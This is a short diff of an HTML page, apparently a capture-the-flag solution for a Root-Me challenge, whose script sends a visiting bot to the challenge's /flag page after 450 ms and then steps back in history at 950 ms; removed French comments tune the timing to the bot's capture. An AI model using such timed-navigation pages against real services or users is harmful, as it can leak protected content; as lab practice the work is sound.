@@ -2,11 +2,12 @@
 <html>
 <head>
 <script>
-  // TES tests = 1.47s local = bot capture à 1.5s
-  // Donc navigation à EXACTEMENT 450ms
   setTimeout(() => {
     location.href = 'http://challenge01.root-me.org:58007/flag';
   }, 450);
+  setTimeout(() => {
+    history.go(-1);
+  }, 950);
 </script>
 </head>
 </html>
